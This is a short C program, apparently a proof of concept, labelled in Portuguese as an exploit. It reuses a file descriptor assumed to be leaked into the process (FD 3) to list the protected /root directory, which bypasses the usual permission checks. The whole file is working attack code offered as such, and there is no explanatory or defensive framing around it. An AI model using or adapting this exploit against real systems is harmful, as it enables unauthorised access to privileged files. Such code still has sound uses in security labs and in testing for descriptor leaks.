#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <unistd.h>

int main() {
    int leaked_fd = 3; 
    DIR *dirp;
    struct dirent *entry;

    printf("[Exploit] A tentar aceder ao FD %d herdado...\n", leaked_fd);

    dirp = fdopendir(leaked_fd);

    printf("[Sucesso] Conteúdo da diretoria /root (via FD leaked):\n");
    while ((entry = readdir(dirp)) != NULL) {
        printf("  - %s\n", entry->d_name);
    }

    closedir(dirp);
    return 0;
}